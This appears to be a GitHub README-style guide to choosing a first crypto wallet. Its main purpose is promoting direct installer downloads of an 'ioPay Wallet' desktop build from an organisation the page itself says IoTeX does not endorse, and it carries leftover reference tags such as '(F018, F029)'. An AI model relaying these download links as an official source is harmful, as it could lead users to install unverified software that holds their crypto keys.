![ioPay Wallet: desktop wallet guide](assets/banner-article.png)

# Best Crypto Wallet for Beginners: How to Choose Your First, and Where Desktop Fits

There is no best crypto wallet for beginners in the abstract. There is a best *first* wallet for **how you hold, what chain you use and what you plan to do with it** - and getting those three right matters far more than the brand on the installer.

<p align="center"><a href="https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-win-v2.0.2.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-0969da?style=for-the-badge&labelColor=0B1733&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=white" alt="Download for Windows"></a> <a href="https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-macos-v2.0.2.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-0969da?style=for-the-badge&labelColor=0B1733&logo=apple&logoColor=white" alt="Download for macOS"></a> <a href="https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-linux-v2.0.2.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-0969da?style=for-the-badge&labelColor=0B1733&logo=linux&logoColor=white" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
|---|---|---|
| ![Windows](https://img.shields.io/badge/platform-Windows-0969da?style=flat-square&labelColor=0B1733&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=white) | Windows 10 (1909) or later, 64-bit | [iopay-wallet-desktop-win-v2.0.2.exe](https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-win-v2.0.2.exe) |
| ![macOS](https://img.shields.io/badge/platform-macOS-0969da?style=flat-square&labelColor=0B1733&logo=apple&logoColor=white) | macOS 12 or later | [iopay-wallet-desktop-macos-v2.0.2.dmg](https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-macos-v2.0.2.dmg) |
| ![Linux](https://img.shields.io/badge/platform-Linux-0969da?style=flat-square&labelColor=0B1733&logo=linux&logoColor=white) | x64, Ubuntu 20.04 or later, or equivalent | [iopay-wallet-desktop-linux-v2.0.2.zip](https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-linux-v2.0.2.zip) |

</div>

All three files and their sizes are on the [ioPay Wallet v2.0.2 release page](https://github.com/iopay-project/iopay-desktop-wallet/releases/tag/v2.0.2); their SHA-256 values are published in the [app README](https://github.com/iopay-project/iopay-desktop-wallet).

> **Only download from this GitHub release page.** A build offered anywhere else is not this release, whatever name it carries.

This page gives you the order to decide in, the things that disqualify a wallet regardless of how it looks, and one worked example - ioPay Wallet for IoTeX - so you can see the criteria applied. It does not rank wallets, and it names no competitors.

## Decide these five things, in this order

**1. Who holds the keys?** A wallet either holds your keys on your device (self-custody) or logs you into an account someone else controls (custodial). Self-custody means no one can freeze your funds - and no one can recover them for you either. Most beginners want self-custody for savings, and a custodial account for small spending balances. Both are legitimate; mixing them up is what hurts.

**2. Desktop, phone or browser?** Each has a different threat model. A phone is with you and harder to lose data from; a desktop gives you a large screen, USB hardware-wallet support and files you control; a browser extension is the most convenient for dApps and the easiest to phish. Most people end up with two of the three.

**3. Which chain do you actually use?** A general EVM wallet will hold almost anything on Ethereum-compatible chains. A chain-specific wallet does far more *for that chain* - staking, bridging, native address formats - and less for everything else. Choose by where your activity is, not by which app store you are in.

**4. What will you do with it?** Holding, staking, bridging, trading and earning device income are different jobs, and the wallet that is pleasant for one can be clumsy for another.

**5. Will you actually back it up?** Every self-custody wallet makes the same demand: a phrase on paper, stored somewhere else, tested once. A wallet you will not back up properly is worse than a custodial account, because the failure is permanent.

## What disqualifies a wallet

- **It asks for your seed phrase anywhere but its own import screen.** That is theft, always.
- **It has no way to export your keys.** If you cannot leave, you do not control anything.
- **It exists only as a download from an ad or a mirror.** Install from the project's own release channel.
- **It cannot tell you what it is.** A wallet should state its licence, its code availability and its release version. If it does not, you cannot check anything.
- **It promises returns or "recovery".** Wallets do not pay yields by existing, and nothing can recover a lost phrase.

## The criteria applied: ioPay Wallet for IoTeX

Here is how one wallet measures against the five decisions, so the criteria are concrete rather than abstract.

**Custody.** Self-custody. Keys are stored locally, protected by your operating system's keychain, with a PIN and biometric lock in front. Creating a wallet produces a **12- or 24-word phrase**; you can also import a phrase, a private key or a keystore file, and hold several accounts under one phrase (F018, F029).

**Platform.** Desktop - Windows, macOS and Linux (F010). There is no browser extension and this page will not pretend otherwise.

**Chain.** IoTeX, an EVM-compatible layer 1 with native token IOTX and mainnet chain ID **4689** (F030). It is a focused wallet, not a multi-chain one, and that is the trade: more depth on IoTeX, less reach elsewhere.

**Jobs.** Staking with validator comparison, buckets and stake-lock; the IoTube bridge; an in-wallet swap; DePIN device income; portfolio and tax export; hardware signing over USB (F021, F023, F025, F027, F028).

**Backup.** A phrase, plus private key or keystore import. That is the whole recovery story, and it is why the first thing to read after installing is [the backup guide](https://github.com/iopay-project/desktop-setup-and-safety/blob/main/how-to-back-up-an-iopay-seed-phrase.md).

**What it is not:** it is not endorsed by IoTeX as far as any published page states (F041), it is not a custodial service, and it cannot recover a lost phrase. The code is public and the licence is Apache-2.0 (F005), which is the check a beginner can actually perform.

## The beginner mistakes worth naming

**Buying before backing up.** Create the wallet, back it up, test the restore, *then* fund it.

**Keeping the phrase in the same place as the device.** A wallet and its backup in one bag is one accident away from zero wallets.

**Staking on day one because the APY looks good.** Staking locks tokens and exposes them to slashing. Learn what a bucket is, and that getting out takes days rather than a click, before you commit. [What staking involves](https://github.com/iopay-project/staking-bridge-and-depin/blob/main/how-to-stake-iotx-in-iopay-wallet.md) - [how unstaking works](https://github.com/iopay-project/staking-bridge-and-depin/blob/main/iotex-unstaking-period-explained-for-iopay-users.md).

**Confusing the two address forms.** Every IoTeX account has an `io1...` and a `0x...` address. Both are yours; which you give out depends on the sender. [The address page](https://github.com/iopay-project/desktop-setup-and-safety/blob/main/io1-and-0x-addresses-in-iopay.md) explains it once.

**Typing a phrase into a "wallet checker".** There is no such service. There are only thefts with good design.

## FAQ

**What is the best crypto wallet for a PC?**
The one that matches your chain and your jobs. For a PC, priorities are: local keys, a tested backup, hardware-wallet support, and a release you can verify. A desktop wallet focused on the chain you use will do more for you than a general one, and less outside it.

**What is the best crypto wallet for beginners?**
Self-custody, a phrase you can back up, a clear release history, and a scope you understand. The brand matters less than those four. Beginners should also start small: a wallet you have restored once from paper is a wallet you understand.

**Which crypto wallet is allowed in the UK?**
Jurisdiction rules apply to *services* - exchanges, custodians, advisers - rather than to wallet software you run yourself, and they change. This page does not give legal or tax advice: check the current rules with the regulator or a professional, and check what the venue you use is registered to do.

## Where to go next

- [How ioPay compares to other desktop wallets](https://github.com/iopay-project/choosing-the-right-wallet/blob/main/how-iopay-wallet-compares-to-other-desktop-wallets.md) - the one page in this project that names peers, without ranking them.
- [ioPay's role in the IoTeX ecosystem](https://github.com/iopay-project/choosing-the-right-wallet/blob/main/iopay-wallet-role-in-the-iotex-ecosystem.md) - what the chain is, and what the wallet is not.
- [What ioPay Wallet is](https://github.com/iopay-project/desktop-setup-and-safety/blob/main/what-is-iopay-wallet.md) - the product in one page.
